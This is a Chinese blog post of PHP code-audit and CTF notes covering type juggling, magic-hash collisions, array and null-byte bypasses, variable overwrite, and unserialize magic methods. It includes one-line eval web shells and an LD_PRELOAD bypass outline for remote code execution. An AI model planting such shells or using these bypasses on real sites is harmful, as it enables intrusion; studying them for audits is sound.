<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="emmmm 感觉没啥好说的"><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>PHP代码审计 | zhiliya</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="zhiliya" type="application/atom+xml">
</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">zhiliya</a></h1></div><p class="m-desc">心之所向，无惧无悔,<br>愿求仁得仁，复无怨怼！</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">PHP代码审计</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">2019-11-15</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/web/">web</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>Un要是0，而且不能为0；if($UN==0 and $UN)</p>
<p>un=0 and 1  或</p>
<p>un=”01123”</p>
<p> <code>&lt;?php phpinfo();?&gt;</code> </p>
<p><code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code></p>
<p> @eval(getallheaders()[‘Accept-Language’]); </p>
<h3 id="LD-PRELOAD-putenv-打一套组合拳，既能绕过-open-basedir，又能绕过-disable-functions"><a href="#LD-PRELOAD-putenv-打一套组合拳，既能绕过-open-basedir，又能绕过-disable-functions" class="headerlink" title="LD_PRELOAD+putenv 打一套组合拳，既能绕过 open basedir，又能绕过 disable functions"></a><code>LD_PRELOAD</code>+<code>putenv</code> 打一套组合拳，既能绕过 open basedir，又能绕过 disable functions</h3><p>LD_PRELOAD 与 putenv</p>
<p>即 LD_PRELOAD 这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用</p>
<p>而 putenv 可以设置环境变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv ( string $setting ) : bool</span><br></pre></td></tr></table></figure>

<p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p>
<p>同时该函数也未被过滤。那么我们可以有如下骚操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\1. 制作一个恶意 shared libraries</span><br><span class="line">\2. 使用 putenv 设置 LD_PRELOAD 为恶意文件路径</span><br><span class="line">\3. 使用某个 php 函数  phpmail() ，触发 specific shared library</span><br><span class="line">\4. 成功进行 RCE</span><br></pre></td></tr></table></figure>



<h3 id="绕过-open-basedir-限制操作文件的方法"><a href="#绕过-open-basedir-限制操作文件的方法" class="headerlink" title="绕过 open_basedir 限制操作文件的方法"></a>绕过 open_basedir 限制操作文件的方法</h3><p> <strong>命令执行函数</strong> </p>
<p> 由于 open_basedir 的设置对 system 等命令执行函数是无效的，所以我们可以使用命令执行函数来访问限制目录。 </p>
<p> 接下来我们用 system 函数尝试绕 open_basedir 的限制来删除 1.txt </p>
<p> 由于命令执行函数一般都会被限制在 disable_function 当中，所以我们需要寻找其他的途径来绕过限制。 </p>
<p> <strong>symlink () 函数</strong> </p>
<p> bool symlink ( string $target , string $link ) </p>
<p> symlink 函数将建立一个指向 target 的名为 link 的符号链接，当然一般情况下这个 target 是受限于 open_basedir 的。 </p>
<p>  <strong>glob 伪协议</strong> </p>
<p><a href="https://www.jb51.net/article/141767.htm" target="_blank" rel="noopener">https://www.jb51.net/article/141767.htm</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">【】is_numeric 当有两个is_numeric判断并用<span class="keyword">and</span>连接时，<span class="keyword">and</span>后面的is_numeric可以绕过</span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line">$b=<span class="string">"dfs"</span>;</span><br><span class="line">$c=is_numeric($a) <span class="keyword">and</span> is_numeric($b);</span><br><span class="line">var_dump(is_numeric($a));</span><br><span class="line">var_dump(is_numeric($b));</span><br><span class="line">var_dump($c); <span class="comment">//$b可以不是数字，同样返回true</span></span><br><span class="line">$test= <span class="keyword">true</span> <span class="keyword">and</span> <span class="keyword">false</span>;</span><br><span class="line">var_dump($test); <span class="comment">//返回true</span></span><br><span class="line">	is_numeric绕过</span><br><span class="line">空格、\t、\n、\r、\v、\f、+、-能够出现在参数开头，“点”能够在参数任何位置，E、e只能出现在参数中间。</span><br><span class="line">【】<span class="keyword">NULL</span>,<span class="number">0</span>,”<span class="number">0</span>″,<span class="keyword">array</span>()使用==和<span class="keyword">false</span>比较时，都是会返回<span class="keyword">true</span>的</span><br><span class="line"></span><br><span class="line">【】接收参数$a得存在，并且$a==<span class="number">0</span>可用.绕过（非数字都可绕过）</span><br><span class="line">测试代码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">if</span> ($a==<span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"1"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($a) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"must"</span>;</span><br><span class="line">&#125;</span><br><span class="line">【】php5,<span class="number">3</span>,<span class="number">29</span>,这里可以直接用%<span class="number">0</span>b绕过\s（空白字符）的匹配</span><br><span class="line">【】intval()函数。</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'42'</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'+42'</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'-42'</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'042'</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'1e10'</span>);                  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'420000000000000000000'</span>); <span class="comment">// 2147483647</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>, <span class="number">8</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'42'</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">'foo'</span>, <span class="string">'bar'</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">if</span>(intval($k1) !== $cc || $k1 === $cc)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lol no\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="keyword">array</span>()) = <span class="keyword">null</span></span><br><span class="line"></span><br><span class="line">sha1(<span class="keyword">array</span>()) = <span class="keyword">null</span></span><br></pre></td></tr></table></figure>



<h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727134527752.png" alt="image-20200727134527752" style="zoom:80%;">

<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727134638827.png" alt="image-20200727134638827" style="zoom:80%;">

<p>MD5大全：</p>
<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/0ve5tws5dm.jpeg" alt="0ve5tws5dm" style="zoom: 67%;">

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line">md5(CbDLytmyGm2xQyaLNhWn) &#x3D;&gt; 0ec20b7c66cafbcc7d8e8481f0653d18</span><br><span class="line">md5(md5(CbDLytmyGm2xQyaLNhWn)) &#x3D;&gt; 0e3a5f2a80db371d4610b8f940d296af</span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line">md5(770hQgrBOjrcqftrlaZk) &#x3D;&gt; 0e689b4f703bdc753be7e27b45cb3625</span><br><span class="line">md5(md5(770hQgrBOjrcqftrlaZk)) &#x3D;&gt; 0e2756da68ef740fd8f5a5c26cc45064</span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br><span class="line">md5(7r4lGXCH2Ksu2JNT3BYM) &#x3D;&gt; 0e269ab12da27d79a6626d91f34ae849</span><br><span class="line">md5(md5(7r4lGXCH2Ksu2JNT3BYM)) &#x3D;&gt; 0e48d320b2a97ab295f5c4694759889f</span><br><span class="line"></span><br><span class="line">0e215962017</span><br></pre></td></tr></table></figure>

<p>// 0e 开头会被当成数字，又是等于 0*10^xxx=0</p>
<p>// 如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过</p>
<p>‘0e509367213418206700842008763514’ == ‘0e481036490867661113260034900752’;</p>
<p>‘0e481036490867661113260034900752’ == ‘0’ ;</p>
<p>var_dump(md5(‘240610708’) == md5(‘QNKCDZO’));</p>
<p>var_dump(md5(‘aabg7XSs’) == md5(‘aabC9RqS’));</p>
<p>var_dump(sha1(‘aaroZmOk’) == sha1(‘aaK1STfY’));</p>
<p>var_dump(sha1(‘aaO8zKZF’) == sha1(‘aa3OFF9m’));</p>
<p>常见的payload有</p>
<p>  QNKCDZO</p>
<p>  240610708</p>
<p>  s878926199a</p>
<p>  s155964671a</p>
<p>  s214587387a</p>
<p>  s214587387a</p>
<p>   sha1(str)</p>
<p>  sha1(‘aaroZmOk’) </p>
<p>  sha1(‘aaK1STfY’)</p>
<p>  sha1(‘aaO8zKZF’)</p>
<p>  sha1(‘aa3OFF9m’)</p>
<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/clip_image002-1573826613926.jpg" alt="img" style="zoom:150%;">





<p>true = = “a”     布尔值true可以跟任何字符串匹配相等</p>
<p>·     ‘0xabcdef’==’11259375’ //true</p>
<p>·     当字符串开头不为0，那么字符串与数字匹配时被转为0（”a” = = 0）；</p>
<p>·     x=0.99999999999999999（小数点后至少有17位）即可满足x==’1’ and x= =’0’;</p>
<p>SHA1</p>
<p> 例子：<code>sha1($_GET[&#39;uname&#39;]) === sha1($_GET[&#39;passwd&#39;]</code></p>
<p>sha1比较数组漏洞： uname[]=1&amp;passwd[]=23 即可绕过 (注:数组数字可任意)</p>
<p>同时MD5不能处理数组，若有以下判断则可用数组绕过</p>
<p>if(@md5($_GET[‘a’]) == @md5($_GET[‘b’]))</p>
<p>{</p>
<p>  echo “yes”;</p>
<p>}</p>
<p>//<a href="http://127.0.0.1/1.php?a[]=1&amp;b[]=2" target="_blank" rel="noopener">http://127.0.0.1/1.php?a[]=1&amp;b[]=2</a></p>
<p>if (@sha1([]) == false)</p>
<p>  echo 1;</p>
<p>if (@md5([]) == false)</p>
<p>  echo 2;</p>
<p>echo var_dump(@sha1([]));</p>
<p>返回值为NULL</p>
<h3 id="Strops"><a href="#Strops" class="headerlink" title="Strops"></a>Strops</h3><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p>
<p> strpos() 函数对大小写敏感。</p>
<p> 该函数是二进制安全的。</p>
<p> <code>strpos(string, find, start)</code> <em>string</em> 和 <em>find</em> 必需，<em>start</em> 可选，规定在何处开始搜索。</p>
<p>查找”touch”在字符串中第一次出现的位置：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\<span class="number">1.</span>    <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">\<span class="number">2.</span>      <span class="keyword">echo</span> strpos(<span class="string">"love is a touch and yet not a touch"</span>, <span class="string">"touch"</span>)</span><br><span class="line"></span><br><span class="line">\<span class="number">3.</span>    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> <strong>stripos()</strong> - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p>
<p> <strong>strripos()</strong> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</p>
<p> <strong>strrpos()</strong> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</p>
<p><code>strpos(array(),&quot;abc&quot;) = null</code></p>
<h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>判断的时候是不能用 <em>!= false</em>来判断的，因为当查找的字符串位置为0 时也会判断成功</p>
<p>\1.    &lt;?php </p>
<p>\2.    $a = “stark”;</p>
<p>\3.    $b = “s”;</p>
<p>\4.    $c = “k”;</p>
<p>\5.     </p>
<p>\6.    var_dump(strpos($a, $b));</p>
<p>\7.    var_dump(strpos($a, $c));</p>
<p>\8.    var_dump(strpos($a, $b) != false);</p>
<p>\9.    var_dump(strpos($a, $b) !== false);</p>
<p>\10.  ?&gt;</p>
<h3 id="ereg函数漏洞-00截断"><a href="#ereg函数漏洞-00截断" class="headerlink" title="ereg函数漏洞   00截断"></a>ereg函数漏洞   00截断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+[        DISCUZ_CODE_2        ]quot;, $_GET['password']) === FALSE)  </span></span><br><span class="line"><span class="string">        echo 'You password must be alphanumeric';  </span></span><br><span class="line"><span class="string">    else if (strpos ($_GET['password'], '--') !== FALSE)  </span></span><br><span class="line"><span class="string">        die('Flag: ' . $flag);  </span></span><br><span class="line"><span class="string">    else  </span></span><br><span class="line"><span class="string">        echo 'Invalid password';  </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p><code>ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE</code></p>
<p>字符串对比解析 </p>
<p>1.在这里如果 $_GET[‘password’]为数组，则ereg返回值为NULL </p>
<p><code>?nctf[]=aa</code></p>
<p>2.如果为123 || asd || 12as || 123%00&amp;&amp;&amp;**，则返回值为true    ereg读到%00的时候，就截止了，所以可以构造s%00–</p>
<p><code>?nctf=111%00%23biubiubiu</code></p>
<p>其余为false</p>
<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><h2 id="可变变量引起的变量覆盖"><a href="#可变变量引起的变量覆盖" class="headerlink" title="可变变量引起的变量覆盖"></a>可变变量引起的变量覆盖</h2><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727135134930.png" alt="image-20200727135134930" style="zoom:80%;">

<h2 id="函数引起的变量覆盖"><a href="#函数引起的变量覆盖" class="headerlink" title="函数引起的变量覆盖"></a>函数引起的变量覆盖</h2><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖</p>
<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727135342461.png" alt="image-20200727135342461" style="zoom:80%;">

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    $auth = <span class="string">'0'</span>;  </span><br><span class="line">    <span class="comment">// 这里可以覆盖$auth的变量值</span></span><br><span class="line">    extract($_GET);       传auth=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>($auth == <span class="number">1</span>)&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"private!"</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"public!"</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$a=<span class="string">'hi'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;  传</span><br><span class="line">        <span class="keyword">echo</span> $key;</span><br><span class="line">        $$key = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str 变量覆盖"></a>parse_str 变量覆盖</h3><p>与 parse_str() 类似的函数还有 mb_parse_str()，</p>
<p>parse_str 将字符串解析成多个变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</p>
<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727140444804.png" alt="image-20200727140444804" style="zoom:80%;">

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;var.php?var&#x3D;new  </span><br><span class="line">$var&#x3D;&#39;init&#39;;  </span><br><span class="line">parse_str($_SERVER[&#39;QUERY_STRING&#39;]);  </span><br><span class="line">print $var;</span><br><span class="line"> </span><br><span class="line">parse_url()</span><br><span class="line">parse_url()的小trick，通过：&#39;&#x2F;&#x2F;&#x2F;x.php?key&#x3D;value&#39;的方式可以使其返回&#39;NULL&#39;，或者xxxx&#x2F;&#x2F;&#x2F;serialized&#x2F;index.php ?file&#x3D;hint.php，必须作用在域名根目录下。漏洞问题只存在于php5.4.7以后存在此漏洞。</span><br></pre></td></tr></table></figure>

<h2 id="13-switch"><a href="#13-switch" class="headerlink" title="13.switch()"></a>13.switch()</h2><p>如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$i &#x3D;&quot;2abc&quot;;  </span><br><span class="line">switch ($i) &#123;  </span><br><span class="line">case 0:  </span><br><span class="line">case 1:  </span><br><span class="line">case 2:  </span><br><span class="line">echo &quot;i is less than 3 but not negative&quot;;  </span><br><span class="line">break;  </span><br><span class="line">case 3:  </span><br><span class="line">echo &quot;i is 3&quot;;  </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这个时候程序输出的是i is less than 3 but not negative，是由于switch()函数将$i进行了类型转换，转换结果为2。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure>

<h2 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h2><p>unset(<em>bar</em>);用来销毁指定的变量，如果变量 bar);用来销毁指定的变量，如果变量  bar); 用来销毁指定的变量，如果变量  bar 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?_CONFIG&#x3D;123</span><br><span class="line">$_CONFIG[&#39;extraSecure&#39;] &#x3D; true;</span><br><span class="line"> </span><br><span class="line">foreach(array(&#39;_GET&#39;,&#39;_POST&#39;) as $method) &#123;</span><br><span class="line">    foreach($$method as $key&#x3D;&gt;$value) &#123;</span><br><span class="line">      &#x2F;&#x2F; $key &#x3D;&#x3D; _CONFIG</span><br><span class="line">      &#x2F;&#x2F; $$key &#x3D;&#x3D; $_CONFIG</span><br><span class="line">      &#x2F;&#x2F; 这个函数会把 $_CONFIG 变量销毁</span><br><span class="line">      unset($$key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if ($_CONFIG[&#39;extraSecure&#39;] &#x3D;&#x3D; false) &#123;</span><br><span class="line">    echo &#39;flag &#123;****&#125;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="14-in-array"><a href="#14-in-array" class="headerlink" title="14.in_array()"></a>14.in_array()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$array&#x3D;[0,1,2,&#39;3&#39;];  </span><br><span class="line">var_dump(in_array(&#39;abc&#39;, $array)); &#x2F;&#x2F;true  </span><br><span class="line">var_dump(in_array(&#39;1bc&#39;, $array)); &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>

<p>可以看到上面的情况返回的都是true,因为’abc’会转换为0，’1bc’转换为1。<br> 在所有php认为是int的地方输入string，都会被强制转换</p>
<h1 id="serialize-和-unserialize漏洞"><a href="#serialize-和-unserialize漏洞" class="headerlink" title="serialize 和 unserialize漏洞"></a>serialize 和 unserialize漏洞</h1><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727140634702.png" alt="image-20200727140634702"></p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727141000354.png" alt="image-20200727141000354"></p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727141021854.png" alt="image-20200727141021854"></p>
<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727141338982.png" alt="image-20200727141338982" style="zoom:80%;">

<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727141658558.png" alt="image-20200727141658558" style="zoom:80%;">

<p>魔术方法</p>
<p>这里我们先简单介绍一下php中的魔术方法（这里如果对于类、对象、方法不熟的先去学学吧），即Magic方法，php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号<strong>开头的，比如 __construct， __destruct，</strong>toString，<strong>sleep，</strong>wakeup等等。这些函数都会在某些特殊时候被自动调用。<br> 例如<strong>construct()方法会在一个对象被创建时自动调用，对应的</strong>destruct则会在一个对象被销毁时调用等等。<br> 这里有两个比较特别的Magic方法，__sleep 方法会在一个对象被序列化的时候调用。 __wakeup方法会在一个对象被反序列化的时候调用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"username: "</span>.<span class="keyword">$this</span>-&gt;username.<span class="string">"&lt;br&gt;"</span>.<span class="string">"password: "</span>.<span class="keyword">$this</span>-&gt;password ;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span 